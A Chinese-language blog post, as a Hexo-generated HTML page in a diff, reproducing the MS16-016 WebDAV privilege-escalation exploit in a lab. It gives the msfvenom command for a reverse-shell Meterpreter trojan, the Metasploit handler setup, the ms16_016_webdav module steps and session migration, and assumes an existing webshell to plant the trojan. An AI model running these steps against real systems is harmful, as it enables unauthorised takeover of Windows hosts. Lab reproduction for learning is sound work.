@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="美豆的博客">
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        基于MSF的MS16-016提权漏洞复现 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/lmc.jpg">
+        </div>
+        <div class="name">
+            <i>美豆</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞简介"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#基于msf的msf16-016漏洞利用实验"><span class="toc-text">基于msf的msf16-016漏洞利用实验</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        基于MSF的MS16-016提权漏洞复现
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2021-04-04 10:50:20</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#漏洞复现" title="漏洞复现">漏洞复现</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <p>漏洞标题：WebDAV 特权提升漏洞</p>
+<p>CVE编号：CVE-2016-0051</p>
+<a id="more"></a>
+<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>MS16-016这个漏洞是由于Windows中的WebDAV客户端中<strong>存在特权提升漏洞</strong>，<strong>该漏洞源于程序没有正确验证客户端的输入</strong>。本地攻击者可利用该漏洞使用提升的特权执行任意代码。</p>
+<p>若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
+<p>以下版本受到影响：</p>
+<blockquote>
+<p>Windows Vista SP2</p>
+<p>Windows Server 2008 x86 &amp; x64</p>
+<p>Windows Server 2008 R2 x64</p>
+<p>Windows 7 x86 &amp; x64</p>
+</blockquote>
+<p>系统中提升权限至系统权限，以下系统中导致系统拒绝服务（蓝屏）：</p>
+<blockquote>
+<p>Windows 8.1 x86 &amp; x64</p>
+<p>Windows Server 2012</p>
+<p>Windows Server 2012 R2</p>
+<p>Windows RT 8.1</p>
+<p>Windows 10</p>
+</blockquote>
+<h1 id="基于msf的msf16-016漏洞利用实验"><a href="#基于msf的msf16-016漏洞利用实验" class="headerlink" title="基于msf的msf16-016漏洞利用实验"></a>基于msf的msf16-016漏洞利用实验</h1><p>首先确定目标主机和攻击机能够ping通：</p>
+<p>攻击机：kali IP地址为：10.211.55.11</p>
+<p>目标机：win7 x86 IP地址：10.211.55.12</p>
+<p><a href="https://imgtu.com/i/cu4Fqe" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4Fqe.jpg" alt="cu4Fqe.jpg"></a></p>
+<p><a href="https://imgtu.com/i/cu49xK" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu49xK.jpg" alt="cu49xK.jpg"></a></p>
+<p>第一步：使用msfvenom生成木马</p>
+<p>在kali的命令行下直接执行以下命令获得一个针对windows的反弹型木马：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.11  LPORT=4444 -f exe &gt; /root/test.exe</span><br></pre></td></tr></table></figure>
+<p>这里我们为生成的木马指定了payload为:<code>windows/meterpreter/reverse_tcp</code>,反弹到的监听端地址为<code>10.211.55.11</code>，监听端口为<code>4444</code>，文件输出格式为<code>exe</code>并保存到路径<code>/root/test.exe</code></p>
+<p><a href="https://imgtu.com/i/cu4p26" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4p26.jpg" alt="cu4p26.jpg"></a></p>
+<p>第二步：kali启动监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 10.211.55.11</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>这里<code>set lport 4444</code>可以省略，因为端口默认为<code>4444</code></p>
+<p><a href="https://imgtu.com/i/cu4PKO" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4PKO.jpg" alt="cu4PKO.jpg"></a></p>
+<p>第三步：复制木马到靶机并运行木马程序</p>
+<p>此处假设我们通过一系列的渗透测试已经得到了目标机器的webshell，因此可以通过文件管理功能把我们上述生成的木马test.exe上传成功。</p>
+<p>在木马程序执行之后，可以看到大型脚本木马显示为请稍后的状态。切换到之前监听的Metasploit命令行窗口，可以看到，目标机正在回连，且Meterpreter会话创建成功：</p>
+<p><a href="https://imgtu.com/i/cu4Ead" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4Ead.jpg" alt="cu4Ead.jpg"></a></p>
+<p>得到会话后，将会话置于后台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Background</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://imgtu.com/i/cu4AVH" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4AVH.jpg" alt="cu4AVH.jpg"></a></p>
+<p>第四步:使用ms16-016模块进行提取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ms16_016_webdav</span><br><span class="line">set session 1</span><br><span class="line">set lport 4444</span><br><span class="line">run  #获取注入的进程号</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://imgtu.com/i/cu4ePI" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4ePI.jpg" alt="cu4ePI.jpg"></a></p>
+<p>第五步:获取后台会话，进入注入进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions 1</span><br><span class="line">migrate [进程号]</span><br></pre></td></tr></table></figure></p>
+<p>提权成功</p>
+<p><a href="https://imgtu.com/i/cu4VIA" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4VIA.jpg" alt="cu4VIA.jpg"></a></p>
+<p>执行以下shell命令即可在一个Meterpreter会话界面中使用cmd shell：</p>
+<p><a href="https://imgtu.com/i/cu4irD" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cu4irD.jpg" alt="cu4irD.jpg"></a></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
